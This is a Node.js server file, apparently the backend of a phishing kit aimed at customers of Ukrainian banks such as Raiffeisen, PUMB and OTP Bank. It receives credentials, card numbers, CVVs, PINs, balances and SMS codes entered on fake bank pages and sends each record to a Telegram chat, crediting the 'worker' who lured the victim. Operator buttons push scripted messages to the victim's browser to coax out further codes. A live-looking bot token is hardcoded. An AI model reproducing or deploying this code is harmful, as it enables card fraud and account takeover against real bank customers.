const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- НАСТРОЙКИ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ---
// 1. Токен вашего бота
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
// 2. ID вашего чата для уведомлений
const CHAT_ID = process.env.CHAT_ID || '-4840920969';
// 3. Публичный URL вашего сервера (хостинга)
const PUBLIC_URL = process.env.PUBLIC_URL;

// Проверка, что PUBLIC_URL задан, иначе бот не сможет работать через вебхук
if (!PUBLIC_URL) {
    console.error("Ошибка: Переменная окружения PUBLIC_URL не установлена. Сервер не может запустить бота.");
    process.exit(1); // Выход из приложения, если URL не указан
}

const WEBHOOK_URL = `${PUBLIC_URL}/bot${TELEGRAM_BOT_TOKEN}`;
// ------------------------------------------------

const banksForRequestButton = [
    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
    'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook успешно установлен на: ${WEBHOOK_URL}`);
}).catch(err => console.error('Ошибка установки вебхука:', err));

bot.sendMessage(CHAT_ID, '🚀 ПРОЕКТ УСПЕШНО ЗАПУЩЕНО НА СЕРВЕРІ! 🚀\nГарного ворку! ✅', { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Bot error:', err));

app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) { console.error('Ошибка обработки сообщения:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('WebSocket error:', error));
});

app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) { console.error('Ошибка декодирования referrer:', e); }

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }
        sessions.set(sessionId, newData);

        let message = `<b>🔥 Новый запис! 🔥</b>\n\n`;
        message += `<b>🏦 Назва банку:</b> ${newData.bankName}\n`;
        
        if (newData.login_type) {
            message += `<b>Тип входу:</b> ${newData.login_type === 'phone' ? 'Номер телефону' : 'Логін'}\n`;
            message += `<b>📱 Логін/Телефон:</b> <code>${newData.login_value}</code>\n`;
            message += `<b>🔒 Пароль:</b> <code>${newData.password}</code>\n`;
        } else {
            message += `<b>📞 Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
            message += `<b>💳 Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
            if (newData['card-expiry']) message += `<b>🗓️ Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
            if (newData['card-cvv']) message += `<b>🔑 CVV:</b> <code>${newData['card-cvv']}</code>\n`;
            if (newData.pin) message += `<b>🔢 Пін:</b> <code>${newData.pin}</code>\n`;
            if (newData.balance) message += `<b>💰 Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        }
        
        const visitText = newData.visitCount === 1 ? '<b>NEW</b> ✨' : `${newData.visitCount} раз`;
        message += `<b>👀 Кількість переходів:</b> ${visitText}\n`;
        message += `<b>👨‍💻 Worker:</b> @${workerNick}\n`;
        message += `<b>🆔 Сесія:</b> <code>${sessionId}</code>`;

        sendToTelegram(message, sessionId, newData.bankName);
    }
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') { workerNick = atob(referrer); } }
    catch (e) { console.error('Ошибка декодирования referrer:', e); }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>💬 Отримано SMS!</b>\n\n`;
        message += `<b>🔢 Код:</b> <code>${code}</code>\n`;
        message += `<b>📞 Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>🆔 Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>👨‍💻 Worker:</b> @${workerNick}`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ДОДАТОК', callback_data: `app:${sessionId}` }],
        [{ text: 'ПІН ❌', callback_data: `pin_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'КОД ✅', callback_data: `timer:${sessionId}` }],
        [{ text: 'Карта ❌', callback_data: `card_error:${sessionId}` }, { text: 'Номер ❌', callback_data: `number_error:${sessionId}` }],
        [{ text: 'OTHER', callback_data: `other:${sessionId}` }]
    ];
    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms': commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" }; break;
            case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
            case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" }; break;
            case 'pin_error': commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; break;
            case 'card_error': commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" }; break;
            case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." }; break;
            case 'request_details': commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' }; break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

bot.on('polling_error', (error) => console.error('Telegram polling error:', error));
app.use((err, req, res, next) => { console.error('Server error:', err); res.status(500).json({ message: 'Internal Server Error' }); });

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
